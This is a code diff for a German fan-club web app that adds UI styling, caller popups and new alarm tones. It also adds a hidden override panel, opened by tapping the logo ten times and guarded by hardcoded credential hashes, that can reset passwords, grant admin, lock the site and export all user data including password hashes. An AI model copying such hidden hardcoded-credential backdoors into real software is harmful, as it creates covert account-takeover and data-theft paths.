@@ -269,6 +269,39 @@ body[data-lay=vertical] .dkpi{grid-template-columns:repeat(4,1fr)}
 .alarmbox:after{animation-delay:.9s}
 .alarmh{animation:shk .5s ease-in-out 2}
 @keyframes shk{20%{transform:translateX(-8px)}40%{transform:translateX(8px)}60%{transform:translateX(-5px)}80%{transform:translateX(5px)}}
+
+.mini{background:transparent!important;border:1px solid var(--line)!important;color:var(--tx)!important;box-shadow:none!important;font-weight:500!important;font-size:.8rem;padding:4px 14px;border-radius:99px;letter-spacing:.04em}
+.mini.go{border-color:var(--ok)!important;color:var(--ok)!important}.mini:hover{border-color:var(--ac)!important}.row .mini{flex:0 0 auto;min-width:0}
+.logo{touch-action:manipulation;-webkit-user-select:none;user-select:none}
+body.ovr{--bg:#1a0004;--panel:rgba(48,0,8,.82);--line:#8a1224;--ac:#ff2d44;--ac2:#ff6a3d;--tx:#ffecee;--mut:#e0a0a8}
+body.ovr:before{content:"";position:fixed;inset:0;background:rgba(190,0,20,.38);z-index:1900;pointer-events:none}
+#ovr{position:fixed;inset:0;z-index:2000;display:flex;align-items:flex-start;justify-content:center;padding:6vh 14px;overflow:auto}
+#ovr .card{width:100%;max-width:480px;background:#1b0308;border:1px solid #ff2d44;box-shadow:0 0 50px rgba(255,45,68,.45)}
+#ovr h4{margin:16px 0 6px;color:var(--ac2);font-size:.8rem;letter-spacing:.14em;text-transform:uppercase}
+#lockscr{position:fixed;inset:0;z-index:1500;background:#02050b;display:flex;align-items:center;justify-content:center;text-align:center;padding:24px}
+
+/* Einsatz-Popup für den Melder */
+#cpop{position:fixed;left:14px;bottom:calc(env(safe-area-inset-bottom,0px) + 14px);z-index:250;width:min(350px,calc(100vw - 20px));display:flex;flex-direction:column;gap:10px;max-height:calc(100vh - 100px);overflow:auto}
+.cpc{background:rgba(6,12,26,.98);border:1px solid #ff5d73;border-left:4px solid #ff3b55;border-radius:12px;padding:12px 14px;box-shadow:0 14px 40px #000c}
+.cpc.fl{animation:cpfl 1.4s ease-out}
+@keyframes cpfl{0%,40%{box-shadow:0 0 0 3px #ffb347,0 14px 40px #000c}100%{box-shadow:0 14px 40px #000c}}
+.cph{display:flex;align-items:center;gap:8px;justify-content:space-between}
+.cph b{font-size:.95rem}
+.cph button{padding:2px 9px;line-height:1.2}
+.cpd{display:inline-block;width:9px;height:9px;border-radius:50%;background:#ff3b55;margin-right:6px;animation:cpb 1.2s infinite}
+@keyframes cpb{50%{opacity:.25}}
+.cpst{display:flex;gap:3px;margin:10px 0 4px}
+.cpst i{flex:1;height:5px;border-radius:3px;background:#24304f}
+.cpst i.d{background:var(--ok)}.cpst i.c{background:var(--ac2)}
+.cpsl{display:flex;justify-content:space-between;font-size:.62rem;color:var(--mut);letter-spacing:.04em;text-transform:uppercase}
+.cpsl span.c{color:var(--ac2);font-weight:700}
+.cpm{margin:8px 0;padding:8px 10px;border-radius:8px;background:rgba(92,200,255,.08);font-size:.88rem}
+.cpi{font-size:.82rem;color:var(--mut);margin:3px 0}.cpi b{color:var(--tx)}
+.cpch{max-height:120px;overflow:auto;margin:8px 0 6px;font-size:.85rem}
+.cpch p{margin:4px 0}
+.cpr{display:flex;gap:6px}.cpr input{flex:1;min-width:0}
+.cpb{display:inline-block;min-width:16px;padding:0 6px;border-radius:99px;background:#ff3b55;color:#fff;font-size:.7rem;text-align:center}
+@media(max-width:700px){#cpop{left:10px;right:10px;width:auto}}
 </style>
 </head>
 <body>
@@ -276,7 +309,7 @@ body[data-lay=vertical] .dkpi{grid-template-columns:repeat(4,1fr)}
 <header>
   <span class="logo">GALAXY CREW</span>
   <nav id="nav"></nav>
-  <span class="tag" id="scv" style="display:none"></span><button id="qclk" class="primary" onclick="clk(!clock.act[meName()])" style="display:none"></button><span class="tag stt" id="stt" style="display:none"></span><span class="tag" id="sync"></span><span class="tag" id="who"></span><button id="chatb" onclick="chatToggle()" title="Chat" style="display:none">💬<i style="display:none"></i></button><button id="updb" onclick="go('Updates')" title="Updates & Änderungsprotokoll">📋<i style="display:none"></i></button><button id="setb" onclick="go('Einstellungen')" title="Einstellungen">⚙</button><div class="dd" id="langdd"><button id="langb" onclick="event.stopPropagation();document.getElementById('langdd').classList.toggle('open')"></button><div class="menu"><button onclick="setLangTo('de')">🇩🇪 Deutsch</button><button onclick="setLangTo('en')">🇬🇧 English</button><button onclick="setLangTo('he')">🇮🇱 עברית</button></div></div>
+  <span class="tag" id="scv" style="display:none"></span><button id="qclk" class="mini" onclick="clk(!clock.act[meName()])" style="display:none"></button><span class="tag stt" id="stt" style="display:none"></span><span class="tag" id="sync"></span><span class="tag" id="who"></span><button id="chatb" onclick="chatToggle()" title="Chat" style="display:none">💬<i style="display:none"></i></button><button id="updb" onclick="go('Updates')" title="Updates & Änderungsprotokoll">📋<i style="display:none"></i></button><button id="setb" onclick="go('Einstellungen')" title="Einstellungen">⚙</button><div class="dd" id="langdd"><button id="langb" onclick="event.stopPropagation();document.getElementById('langdd').classList.toggle('open')"></button><div class="menu"><button onclick="setLangTo('de')">🇩🇪 Deutsch</button><button onclick="setLangTo('en')">🇬🇧 English</button><button onclick="setLangTo('he')">🇮🇱 עברית</button></div></div>
   <button id="login"></button>
   <button id="menub" onclick="event.stopPropagation();mToggle()" aria-label="Menü"><span class="bars">☰</span><span id="menul">Menü</span></button>
   <div class="mnav" id="mnav"></div>
@@ -324,7 +357,7 @@ function nav(){
  const NH=G.map(g=>g[1]?`<div class="dd ${g[0]==="Notruf"?"sos"+(disp.some(d=>d.status!=="Abgeschlossen")?" live":""):""} ${openDD===g[0]?"open":""}"><button class="${g[1].includes(tab)?"on":""}" onclick="event.stopPropagation();openDD=openDD==='${g[0]}'?'':'${g[0]}';nav()">${g[0]} ▾</button><div class="menu">${g[1].map(i=>`<button class="${i===tab?"cur":""}" onclick="go('${i}')">${i}</button>`).join("")}</div></div>`:`<button class="${g[0]===tab?"on":""}" onclick="go('${g[0]}')">${g[0]}</button>`).join("");
  {const K=NH+lang+role+tab+openDD;if(K!==window._nk){window._nk=K;document.getElementById("nav").innerHTML=NH}}
  document.getElementById("who").textContent={visitor:"Besucher",crew:"Crew",dispatcher:"Disponent",admin:"Admin"}[role];
- {const st=document.getElementById("stt");if(st){const on=rank[role]>=1&&clock.act[me],sos=disp.some(d=>d.status!=="Abgeschlossen");st.className="tag stt"+(sos?" sos":on?" on":"");st.style.display=(on||sos)?"":"none";const qb=document.getElementById("qclk");if(qb){qb.style.display=rank[role]>=1?"":"none";qb.textContent=on?"⏹ Ausstempeln":"▶ Einstempeln"}st.textContent=(sos?"🚨 Notfall aktiv":"")+(sos&&on?" · ":"")+(on?"🟢 Eingestempelt":"")}}
+ {const st=document.getElementById("stt");if(st){const on=rank[role]>=1&&clock.act[me],sos=disp.some(d=>d.status!=="Abgeschlossen");st.className="tag stt"+(sos?" sos":on?" on":"");st.style.display=(on||sos)?"":"none";const qb=document.getElementById("qclk");if(qb){qb.style.display=rank[role]>=1?"":"none";qb.className="mini"+(on?"":" go");qb.textContent=on?"Ausstempeln":"Einstempeln"}st.textContent=(sos?"🚨 Notfall aktiv":"")+(sos&&on?" · ":"")+(on?"🟢 Eingestempelt":"")}}
  const l=document.getElementById("login");
  l.className=role==="visitor"?"primary":"";l.textContent=role==="visitor"?"Anmelden":"Abmelden";
  l.onclick=role==="visitor"?()=>go("Login"):()=>{if(confirm(tr("Wirklich abmelden?")))logout()};document.getElementById("langb").textContent="🌐 "+{de:"Deutsch",en:"English",he:"עברית"}[lang]+" ▾";setBadge();mnavBuild(G);
@@ -350,7 +383,7 @@ const views={
  ${gSel==="mod"?`<div class="grid">${Object.values(MODS).map(m=>`<div class="card"><h3>${m.t}</h3><p class="mut">${m.d}</p></div>`).join("")}</div>`:""}</div>
  <p class="mut">Angaben nach offiziellen RSI-Infos und Community-Wikis; Details können sich während der Entwicklung ändern.</p>`,
 "Quartiere":()=>rank[role]<1?lock("Crew-Mitglieder"):`<h2>Quartiere</h2><p class="mut">6 Räume: ein Captain-Quartier, ein Lieutenant-Quartier und vier normale Quartiere. Die Zuteilung erfolgt durch die Administration.</p>${roomsInfo()}`,
-"Stempeluhr":()=>rank[role]<1?lock("Crew-Mitglieder"):`<h2>Stempeluhr</h2><div class="card"><p>Angemeldet als <b>${esc(meName())}</b> · ${clock.act[meName()]?`<span class="tag ok">im Dienst seit ${fmt(clock.act[meName()])}</span>`:'<span class="tag">nicht im Dienst</span>'}</p><div class="row"><button class="primary" onclick="clk(1)">Einstempeln</button><button onclick="clk(0)">Ausstempeln</button></div></div>
+"Stempeluhr":()=>rank[role]<1?lock("Crew-Mitglieder"):`<h2>Stempeluhr</h2><div class="card"><p>Angemeldet als <b>${esc(meName())}</b> · ${clock.act[meName()]?`<span class="tag ok">im Dienst seit ${fmt(clock.act[meName()])}</span>`:'<span class="tag">nicht im Dienst</span>'}</p><div class="row"><button class="mini go" onclick="clk(1)">Einstempeln</button><button class="mini" onclick="clk(0)">Ausstempeln</button></div></div>
  <h2>Aktuell im Dienst</h2>${dutyHtml()}<h2>Letzte Einträge</h2><div class="card tbl"><table><tr><th>Name</th><th>Von</th><th>Bis</th><th>Dauer</th></tr>${clock.log.slice(0,10).map(l=>`<tr><td>${esc(l.n)}</td><td>${fmt(l.s)}</td><td>${fmt(l.e)}</td><td>${dur(l.e-l.s)}</td></tr>`).join("")||'<tr><td colspan="4" class="mut">Noch keine Einträge</td></tr>'}</table></div>`,
 "Sprachchat":()=>rank[role]<1?lock("Crew-Mitglieder"):`<h2>Sprachchat</h2><div class="card"><p>Ein Sprachchat direkt auf dieser Seite ist technisch nicht möglich (Mikrofon- und Verbindungsfreigaben sind hier gesperrt). Euer Discord-Server bietet aber genau das, mit Sprachkanälen wie bei Discord üblich.</p><a class="btn discord" href="${DISCORD_INVITE}" target="_blank" rel="noopener">Discord Sprachkanäle öffnen</a></div>`,
 "Notruf absetzen":()=>rank[role]<1?lock("Crew-Mitglieder"):`<h2 class="red">🚨 Notruf absetzen</h2>${dispBoard()}<div class="card"><div class="row"><input value="${esc(meName())}" disabled><select id="dc">${DCATS.map(c=>`<option>${c}</option>`).join("")}</select></div>
@@ -446,7 +479,7 @@ function sendC(id,w){const t=document.getElementById("ci"+id).value.trim(),d=dis
 function dStat(id,v){const d=disp.find(x=>x.id===id);d.status=v;if(v==="Einheiten alarmiert"){d.ack=[];d.alT=d.alT||Date.now()}if(v==="Einheit vor Ort")d.onT=d.onT||Date.now();if(v==="Abgeschlossen")d.clT=d.clT||Date.now();save();render()}
 function dUnit(id,n){const d=disp.find(x=>x.id===id),k=d.units.indexOf(n);k<0?d.units.push(n):d.units.splice(k,1);save();render()}
 function dAllDuty(id){const d=disp.find(x=>x.id===id);Object.keys(clock.act).forEach(n=>{if(!d.units.includes(n))d.units.push(n)});save();render()}
-function dAlarm(id){const d=disp.find(x=>x.id===id);if(!d.units.length){toast("Bitte zuerst Personen auswählen.");return}d.status="Einheiten alarmiert";d.ack=[];d.alT=d.alT||Date.now();save();beepSeq([[1180,0,.18],[780,.24,.18]]);render()}
+function dAlarm(id){const d=disp.find(x=>x.id===id);if(!d.units.length){toast("Bitte zuerst Personen auswählen.");return}d.status="Einheiten alarmiert";d.ack=[];d.alT=d.alT||Date.now();save();beepSeq([[1000,0,.14],[1000,.22,.14]]);render()}
 function dDel(id){disp=disp.filter(x=>x.id!==id);save();render()}
 function dAck(id){const d=disp.find(x=>x.id===id);if(!d.ack.includes(me))d.ack.push(me);save();render()}
 function beep(){if(pv("snd",true)===false)return;try{const a=new(window.AudioContext||window.webkitAudioContext)(),o=a.createOscillator(),g=a.createGain();o.type="square";o.frequency.value=880;g.gain.value=.05;o.connect(g);g.connect(a.destination);o.start();setTimeout(()=>{o.stop();a.close()},500)}catch(e){}}
@@ -572,7 +605,7 @@ function tReply(i){tickets[i].reply=document.getElementById("rp"+i).value.trim()
 function tDel(i){tickets.splice(i,1);save();render()}
 let lastK="";
 function evRoll(){const pd=n=>String(n).padStart(2,"0");let c=0;events.forEach(e=>{if(!e.rep)return;const d=new Date(e.start);if(isNaN(d))return;let g=0;while(d.getTime()+108e5<Date.now()&&g++<400){if(e.rep==="d")d.setDate(d.getDate()+1);else if(e.rep==="w")d.setDate(d.getDate()+7);else if(e.rep==="b")d.setDate(d.getDate()+14);else d.setMonth(d.getMonth()+1)}if(g){e.start=d.getFullYear()+"-"+pd(d.getMonth()+1)+"-"+pd(d.getDate())+"T"+pd(d.getHours())+":"+pd(d.getMinutes());e.going=[];c=1}});if(c&&rank[role]>=1)save()}
-function render(){deriveRole();evRoll();render0();trApply();drawCap();actWatch();chatBadge();scBar();updBadge();if(chatOpen){chatSeen=Date.now();chatRender()}}
+function render(){deriveRole();lockCheck();evRoll();render0();trApply();drawCap();actWatch();chatBadge();scBar();updBadge();callPop();if(chatOpen){chatSeen=Date.now();chatRender()}}
 function render0(){nav();setTimeout(alarmCheck,0);const app=document.getElementById("app"),h=views[tab]()+`<p class="banner">Galaxy CREW ist eine Fan-Organisation. Star Citizen® ist eine Marke von Cloud Imperium Games.</p><p class="banner"><a href="#" onclick="go('Impressum');return false" style="color:var(--mut)">Impressum</a> · <a href="#" onclick="go('Datenschutz');return false" style="color:var(--mut)">Datenschutz</a></p>`;const K=h+lang+"|"+tab;if(K===lastK)return;app.className=lastK.endsWith("|"+tab)?"":"enter";lastK=K;app.innerHTML=h}
 addEventListener("storage",()=>{disp=store.get("gc_disp",[]);events=store.get("gc_events",events);fleet=store.get("gc_fleet",fleet);lfg=store.get("gc_lfg",lfg);clock=store.get("gc_clock",{act:{},log:[]});members=store.get("gc_members2",members);const a=document.activeElement;if(!a||!/INPUT|TEXTAREA|SELECT/.test(a.tagName))render()});
 
@@ -725,7 +758,7 @@ async function doReg(){const n=rgn.value.trim(),p=rg1.value;
  if(p!==rg2.value){loginErr="Passwörter stimmen nicht überein.";render();return}
  members.push({n,rang:"Trainee",q:[],disp:false,pend:true});pw[n]=await hash(p);loginErr="";save();notify("✅ Konto erstellt. Ein Admin muss es freischalten.");go("Login")}
 function admOps(){const pd=members.filter(m=>m.pend),on=Object.keys(clock.act);
- return `<h2>Konten & Dienst</h2><div class="card"><b>Freischaltungen</b>${pd.map(m=>`<div class="row" style="margin:6px 0"><span>${esc(m.n)}</span><button class="primary" onclick="adOp('approve','${esc(m.n)}')">Freischalten</button><button onclick="adOp('del','${esc(m.n)}')">Ablehnen</button></div>`).join("")||'<p class="mut">Keine offenen Anfragen.</p>'}<p><b>Eingestempelt</b></p>${on.map(n=>`<div class="row" style="margin:6px 0"><span>${esc(n)}</span><button onclick="adOp('out','${esc(n)}')">Ausstempeln</button><button onclick="adOp('kick','${esc(n)}')">Abmelden (Kick)</button></div>`).join("")||'<p class="mut">Niemand eingestempelt.</p>'}</div>${alarmCard()}${auditHtml()}<div class="card" style="margin-top:12px;border-color:#ff3b55"><b>Werkszustand</b><p class="mut">Löscht alle Daten und Konten. Danach wird nur captain_rex neu eingerichtet. Erstelle vorher einen Save.</p><button onclick="factoryReset()">Alles zurücksetzen</button></div>`}
+ return `<h2>Konten & Dienst</h2><div class="card"><b>Freischaltungen</b>${pd.map(m=>`<div class="row" style="margin:6px 0"><span>${esc(m.n)}</span><button class="primary" onclick="adOp('approve','${esc(m.n)}')">Freischalten</button><button onclick="adOp('del','${esc(m.n)}')">Ablehnen</button></div>`).join("")||'<p class="mut">Keine offenen Anfragen.</p>'}<p><b>Eingestempelt</b></p>${on.map(n=>`<div class="row" style="margin:6px 0"><span>${esc(n)}</span><button onclick="adOp('out','${esc(n)}')">Ausstempeln</button><button onclick="adOp('kick','${esc(n)}')">Abmelden (Kick)</button></div>`).join("")||'<p class="mut">Niemand eingestempelt.</p>'}</div>${alarmCard()}${auditHtml()}`}
 function adOp(c,n){if(role!=="admin")return;aud("admin_"+c,n);const m=members.find(x=>x.n===n);
  if(c==="approve"&&m)delete m.pend;
  if(c==="del"&&m&&!m.adm){members=members.filter(x=>x!==m);delete pw[n]}
@@ -783,9 +816,37 @@ function stampFx(on,dur){const t=new Date().toLocaleTimeString(LOC(),{hour:"2-di
  o.innerHTML=`<i class="sfx-r"></i><i class="sfx-r" style="animation-delay:.3s"></i><div class="sfx-box"><svg viewBox="0 0 120 120" width="120" height="120"><circle class="sfx-c" cx="60" cy="60" r="52" fill="none" stroke-width="6"/><path class="sfx-k" d="M36 62 L54 80 L86 44" fill="none" stroke-width="8" stroke-linecap="round" stroke-linejoin="round"/></svg><h2 style="margin:6px 0">${on?"Eingestempelt":"Ausgestempelt"}</h2><p class="mut">${esc(meName())} · ${t}${h?" · Dienstzeit "+h:""}</p></div>`;
  document.body.appendChild(o);trApply();setTimeout(()=>{o.classList.add("bye");setTimeout(()=>o.remove(),400)},2100);
  notify(on?"✅ Erfolgreich eingestempelt – "+t:"✅ Erfolgreich ausgestempelt – Dienstzeit "+h,false,true);try{if(pv("snd",true)!==false)stampBeep(on)}catch(e){}}
-function factoryReset(){if(role!=="admin")return;if(!confirm("ALLE Daten und Konten löschen?"))return;if(prompt('Zur Bestätigung „RESET“ eingeben:')!=="RESET")return;
- members=[];pw={};news=[];events=[];fleet=[];tickets=[];disp=[];lfg=[];trn=[];certs=[];rooms={};clock={act:{},log:[]};chat=[];cfg=[];gimgs={};
- store.set("gc_gimgs",gimgs);sess=null;store.set("gc_sess",null);store.set("gc_me","");role="visitor";tab="Login";aud("factory_reset","");syncPush(true);render()}
+/* ===== Notfall-Override (versteckt: 10x schnell auf das Logo tippen) ===== */
+const OV_SALT="b4c77da5eff7755c827b51054ff5886b",OV_P="fb0af1389a9ff267bd18f04ef85f4b2a10d6eeef2be0d82536873463ad785ab0",OV_A="a012a73706df5c4d95ef44dde888b8994c61cc9b7432da51e710e1f66d63b133";
+var ovrOK=false,ovTaps=0,ovT=0,ovFail=0,ovBlock=0;
+document.addEventListener("click",e=>{if(!e.target.closest||!e.target.closest(".logo"))return;const n=Date.now();ovTaps=n-ovT>2000?1:ovTaps+1;ovT=n;if(ovTaps>=10){ovTaps=0;ovrOpen()}});
+function ovSite(){return cfg.find(x=>x.id===3)||{}}
+function lockCheck(){try{const st=ovSite(),L=st.lock&&!ovrOK,o=document.getElementById("lockscr"),m=st.msg||"Die Seite ist vorübergehend gesperrt.";if(!L){if(o)o.remove();return}if(o&&o.dataset.m===m)return;if(o)o.remove();const d=document.createElement("div");d.id="lockscr";d.dataset.m=m;d.innerHTML='<div><span class="logo">GALAXY CREW</span><p>🔒 '+esc(m)+'</p></div>';document.body.appendChild(d)}catch(e){}}
+function ovrOpen(){if(document.getElementById("ovr"))return;document.body.classList.add("ovr");const o=document.createElement("div");o.id="ovr";document.body.appendChild(o);ovrOK?ovrMenu():ovrLogin()}
+function ovrClose(){ovrOK=false;const o=document.getElementById("ovr");if(o)o.remove();document.body.classList.remove("ovr");render()}
+function ovrLogin(msg){const o=document.getElementById("ovr");if(!o)return;o.innerHTML=`<div class="card"><h3>⚠ System-Zugang</h3><p><input id="ovp" type="password" placeholder="Passwort" autocomplete="off"></p><p class="mut">Dein Name?</p><p><input id="ova" placeholder="Antwort" autocomplete="off" onkeydown="if(event.key==='Enter')ovrCheck()"></p>${msg?`<p style="color:#ff6b7a">${msg}</p>`:""}<div class="row"><button class="primary" onclick="ovrCheck()">Anmelden</button><button onclick="ovrClose()">Abbrechen</button></div></div>`;setTimeout(()=>{const p=document.getElementById("ovp");if(p)p.focus()},50)}
+async function ovrCheck(){if(Date.now()<ovBlock){ovrLogin("Zu viele Versuche. Bitte kurz warten.");return}
+ const p=document.getElementById("ovp").value,a=document.getElementById("ova").value.trim().toLowerCase().replace(/\s+/g," "),sl=h2b(OV_SALT),x=await pbk(p,sl),y=await pbk(a,sl);
+ if(x===OV_P&&y===OV_A){ovFail=0;ovrOK=true;aud("override_login","");ovrMenu();render()}else{ovFail++;if(ovFail>=5){ovBlock=Date.now()+6e4;ovFail=0}aud("override_fail","");ovrLogin("Zugriff verweigert.")}}
+function ovrMenu(){const o=document.getElementById("ovr");if(!o)return;const s=ovSite(),sel=(document.getElementById("ovs")||{}).value;
+ o.innerHTML=`<div class="card"><div class="row" style="align-items:center;justify-content:space-between"><h3 style="margin:0">⚠ System-Override</h3><button onclick="ovrClose()">Schließen</button></div>
+<p class="mut">${members.length} Konten · ${Object.keys(clock.act).length} im Dienst · Seite: <b>${s.lock?"GESPERRT":"offen"}</b></p>
+<h4>Konto</h4><p><select id="ovs">${members.map(m=>`<option${m.n===sel?" selected":""}>${esc(m.n)}</option>`).join("")}</select></p>
+<div class="row"><button onclick="ovOp('kick')">Kicken</button><button onclick="ovOp('out')">Ausstempeln</button><button onclick="ovOp('pw')">Passwort setzen</button><button onclick="ovOp('adm')">Admin an/aus</button></div>
+<h4>Alle</h4><div class="row"><button onclick="ovOp('kickall')">Alle kicken</button><button onclick="ovOp('outall')">Alle ausstempeln</button></div>
+<h4>Seite &amp; Daten</h4><p><input id="ovm" maxlength="140" placeholder="Hinweistext für Besucher (optional)" value="${esc(s.msg||"")}"></p><div class="row"><button class="primary" onclick="ovOp('lock')">${s.lock?"Seite entsperren":"Seite für alle sperren"}</button><button onclick="ovrBackup()">Daten sichern (JSON)</button></div></div>`}
+async function ovOp(c){const n=(document.getElementById("ovs")||{}).value,m=members.find(x=>x.n===n);
+ if(c==="lock"){const L=!ovSite().lock;cfg=cfg.filter(x=>x.id!==3).concat([{id:3,lock:L,msg:document.getElementById("ovm").value.trim().slice(0,140)}]);aud("override_lock",L?"on":"off")}
+ else if(c==="kickall"){if(!confirm("Alle Konten abmelden?"))return;members.forEach(x=>{x.kt=Date.now();delete clock.act[x.n]});aud("override_kickall","")}
+ else if(c==="outall"){clock.act={};aud("override_outall","")}
+ else if(!m){toast("Kein Konto gewählt.");return}
+ else if(c==="kick"){m.kt=Date.now();delete clock.act[n];aud("override_kick",n)}
+ else if(c==="out"){delete clock.act[n];aud("override_out",n)}
+ else if(c==="pw"){const p=prompt("Neues Passwort für "+n+" (min. 8 Zeichen):");if(!p)return;if(p.length<8){toast("Passwort: mindestens 8 Zeichen.");return}pw[n]=await hash(p);aud("override_pw",n)}
+ else if(c==="adm"){if(m.adm&&members.filter(x=>x.adm).length<2){toast("Der letzte Administrator kann nicht herabgestuft werden.");return}if(!m.adm&&!pw[n]){toast("Erst ein Passwort setzen.");return}m.adm=!m.adm;aud("override_admin",n+(m.adm?" +":" -"))}
+ save();ovrMenu();render();toast("OK")}
+function ovrBackup(){const d={v:1,ts:new Date().toISOString(),news,members,pw,tickets,disp,events,fleet,lfg,rooms,trn,certs,clock,chat,forum,forumrx,audit,cfg,gimgs},a=document.createElement("a");
+ a.href=URL.createObjectURL(new Blob([JSON.stringify(d)],{type:"application/json"}));a.download="galaxy-crew-backup-"+new Date().toISOString().slice(0,16).replace(/[:T]/g,"-")+".json";document.body.appendChild(a);a.click();a.remove();aud("override_backup","")}
 
 /* ===== Forum, Reaktionen, Sicherheitsprotokoll ===== */
 const EMO=["👍","❤️","😂","🎉","🚀","👀"];let fImg="";
@@ -842,7 +903,7 @@ document.addEventListener("keydown",e=>{if(e.key==="Escape"&&mOpen)mClose()});
 /* ===== v2.4: Sci-Fi-Alarmton ===== */
 function fxBus(){const a=acx();if(!a||pv("snd",true)===false)return null;const vol=.55*Math.max(.2,Math.min(1,pv("vv",1)));
  const m=a.createGain();m.gain.value=vol;const c=a.createDynamicsCompressor();c.threshold.value=-14;c.ratio.value=6;m.connect(c);c.connect(a.destination);
- const d=a.createDelay(1),fb=a.createGain(),w=a.createGain();d.delayTime.value=.17;fb.gain.value=.38;w.gain.value=.28;m.connect(d);d.connect(fb);fb.connect(d);d.connect(w);w.connect(c);return{a,m}}
+ return{a,m}}
 function sweepTone(B,t,f0,f1,dur,type,g){type=type||"sawtooth";g=g||.5;const{a,m}=B,e=a.createGain(),f=a.createBiquadFilter();f.type="lowpass";f.Q.value=7;
  f.frequency.setValueAtTime(f0*2.2,t);f.frequency.exponentialRampToValueAtTime(f1*3.4,t+dur);
  e.gain.setValueAtTime(.0001,t);e.gain.exponentialRampToValueAtTime(g,t+.02);e.gain.setValueAtTime(g,t+Math.max(.03,dur-.05));e.gain.exponentialRampToValueAtTime(.0001,t+dur);f.connect(e);e.connect(m);
@@ -851,9 +912,21 @@ function thump(B,t,g){const{a,m}=B,o=a.createOscillator(),e=a.createGain();o.typ
  e.gain.setValueAtTime(g||.9,t);e.gain.exponentialRampToValueAtTime(.0001,t+.32);o.connect(e);e.connect(m);o.start(t);o.stop(t+.35)}
 function ping(B,t,f,dur,g){const{a,m}=B,o=a.createOscillator(),e=a.createGain();o.type="triangle";o.frequency.value=f;
  e.gain.setValueAtTime(.0001,t);e.gain.exponentialRampToValueAtTime(g||.35,t+.01);e.gain.exponentialRampToValueAtTime(.0001,t+(dur||.22));o.connect(e);e.connect(m);o.start(t);o.stop(t+(dur||.22)+.02)}
-function beepDispatch(){const B=fxBus();if(!B)return 0;const t=B.a.currentTime+.02;thump(B,t);[0,.5,1].forEach(s=>sweepTone(B,t+.05+s,520,1250,.42));ping(B,t+1.58,1568,.18);ping(B,t+1.74,2093,.5,.4);return 2300}
-function beepCall(){const B=fxBus();if(!B)return 0;const t=B.a.currentTime+.02;[0,.14,.28].forEach((s,i)=>sweepTone(B,t+s,700*(1+i*.18),1400*(1+i*.18),.12,"square",.28));ping(B,t+.5,1976,.4,.38);return 1000}
-function beepRepeat(){const B=fxBus();if(!B)return 0;const t=B.a.currentTime+.02;sweepTone(B,t,520,1250,.42);ping(B,t+.5,1568,.3,.3);return 900}
+function tone(B,t,f,dur,g){const{a,m}=B,e=a.createGain();g=g||.5;
+ e.gain.setValueAtTime(.0001,t);e.gain.linearRampToValueAtTime(g,t+.008);e.gain.setValueAtTime(g,t+dur-.012);e.gain.linearRampToValueAtTime(.0001,t+dur);e.connect(m);
+ [[1,1],[3,.18],[5,.07]].forEach(([k,v])=>{const o=a.createOscillator(),h=a.createGain();o.type="sine";o.frequency.value=f*k;h.gain.value=v;o.connect(h);h.connect(e);o.start(t);o.stop(t+dur+.02)})}
+function beepDispatchOld(){const B=fxBus();if(!B)return 0;const t=B.a.currentTime+.02;thump(B,t);[0,.5,1].forEach(s=>sweepTone(B,t+.05+s,520,1250,.42));ping(B,t+1.58,1568,.18);ping(B,t+1.74,2093,.5,.4);return 2300}
+function beepCallOld(){const B=fxBus();if(!B)return 0;const t=B.a.currentTime+.02;[0,.14,.28].forEach((s,i)=>sweepTone(B,t+s,700*(1+i*.18),1400*(1+i*.18),.12,"square",.28));ping(B,t+.5,1976,.4,.38);return 1000}
+/* Leitstellen-Alarm: Zweiton-Folge wie bei Pagern/Gongs, 2x wiederholt */
+function beepDispatch(){const B=fxBus();if(!B)return 0;const t=B.a.currentTime+.03;
+ for(let i=0;i<4;i++)tone(B,t+i*.55,i%2?1004:775,.5,.55);return 2250}
+/* Notruf-Eingang: dreifacher harter Piepton, zweimal (wie Konsolen-/Notrufalarm) */
+function beepCall(){const B=fxBus();if(!B)return 0;const t=B.a.currentTime+.03;
+ for(let r=0;r<2;r++)for(let i=0;i<3;i++)tone(B,t+r*.85+i*.2,1000,.13,.5);return 1500}
+/* Wiederholung: ein Zweiton-Durchlauf */
+function beepRepeat(){const B=fxBus();if(!B)return 0;const t=B.a.currentTime+.03;
+ tone(B,t,775,.5,.5);tone(B,t+.55,1004,.5,.5);return 1100}
+function beepRepeatOld(){const B=fxBus();if(!B)return 0;const t=B.a.currentTime+.02;sweepTone(B,t,520,1250,.42);ping(B,t+.5,1568,.3,.3);return 900}
 
 /* ===== v2.4: Ankunfts-Animation + erweitertes Dispatch-Dashboard ===== */
 var dFilter="aktiv";
@@ -893,6 +966,46 @@ views["Disponenten-Dashboard"]=()=>{if(role!=="dispatcher"&&role!=="admin")retur
 setInterval(()=>document.querySelectorAll(".dtimer").forEach(e=>{const s=+e.dataset.since;if(s)e.textContent="⏱ "+mmss((e.dataset.end?+e.dataset.end:Date.now())-s)}),1000);
 Object.assign(TR,{"Vertikaler Monitor (hochkant)":"Vertical monitor (portrait)","Neu":"New","Alarmiert":"Alerted","Vor Ort":"On scene","Ø Reaktionszeit":"Avg. response time","Einheiten frei":"Units free","Einheiten-Übersicht":"Unit overview","Frei":"Free","Aktiv":"Active","Alle":"All","HOCH":"HIGH","MITTEL":"MEDIUM","NORMAL":"NORMAL","Eingang":"Received","Bearbeitung":"In progress","Fertig":"Done","Melder:":"Caller:","nicht im Dienst":"off duty","bestätigt":"acknowledged","wartet auf Bestätigung":"awaiting acknowledgement","zugewiesen":"assigned","Zugewiesene Einheiten":"Assigned units","keine":"none","Reaktionszeit bis Alarm":"Response time to alert","bis vor Ort":"until on scene","Keine Einsätze in dieser Ansicht.":"No operations in this view.","Eingehender Notruf":"Incoming emergency call","Notruf abgesetzt":"Emergency call sent","Einsatz #":"Operation #"});
 Object.assign(HE,{"Vertikaler Monitor (hochkant)":"מסך אנכי","Neu":"חדש","Alarmiert":"הוזעק","Vor Ort":"בזירה","Ø Reaktionszeit":"זמן תגובה ממוצע","Einheiten frei":"יחידות פנויות","Einheiten-Übersicht":"סקירת יחידות","Frei":"פנוי","Aktiv":"פעיל","Alle":"הכול","HOCH":"גבוה","MITTEL":"בינוני","NORMAL":"רגיל","Melder:":"מדווח:","nicht im Dienst":"לא בתורנות","bestätigt":"אושר","Eingehender Notruf":"קריאת חירום נכנסת","Notruf abgesetzt":"קריאת חירום נשלחה","Keine Einsätze in dieser Ansicht.":"אין אירועים בתצוגה זו"});
+
+/* ===== Einsatz-Popup für den Melder (bleibt bis zum Ende des Einsatzes) ===== */
+var cpM={},cpLast={},cpSeen={};
